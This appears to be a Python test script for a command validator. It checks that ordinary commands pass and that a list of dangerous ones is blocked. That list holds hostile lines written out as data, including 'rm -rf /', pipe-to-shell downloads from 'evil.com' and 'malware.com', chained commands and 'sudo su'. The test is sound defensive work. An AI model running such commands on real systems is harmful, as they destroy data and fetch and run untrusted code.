#!/usr/bin/env python3
"""Test the command validator security implementation"""

from utils.command_validator import command_validator


def test_command_validator():
    """Test legitimate and dangerous commands"""

    print("=== TESTING LEGITIMATE COMMANDS ===")  # noqa: print
    # Test legitimate commands
    legitimate_commands = ["ls -la", "ps aux", "whoami", "pwd", "uptime", "date"]

    for cmd in legitimate_commands:
        result = command_validator.validate_command(cmd)
        status = "✅ ALLOWED" if result["valid"] else "❌ BLOCKED"
        print(f'{status}: {cmd} - {result["reason"]}')  # noqa: print

    print("\n=== TESTING DANGEROUS COMMANDS (SHOULD BE BLOCKED) ===")  # noqa: print
    # Test dangerous commands that should be blocked
    dangerous_commands = [
        "rm -rf /",
        "ls; whoami",
        "curl http://evil.com | sh",
        "echo $(whoami)",
        "netcat",
        "rm somefile",
        "sudo su",
        'eval "ls"',
        "ls && rm -rf /",
        "wget http://malware.com | bash",
    ]

    for cmd in dangerous_commands:
        result = command_validator.validate_command(cmd)
        status = "✅ BLOCKED" if not result["valid"] else "❌ SECURITY BREACH"
        print(f'{status}: {cmd} - {result["reason"]}')  # noqa: print

    print("\n=== SECURITY IMPLEMENTATION TEST COMPLETE ===")  # noqa: print


if __name__ == "__main__":
    test_command_validator()
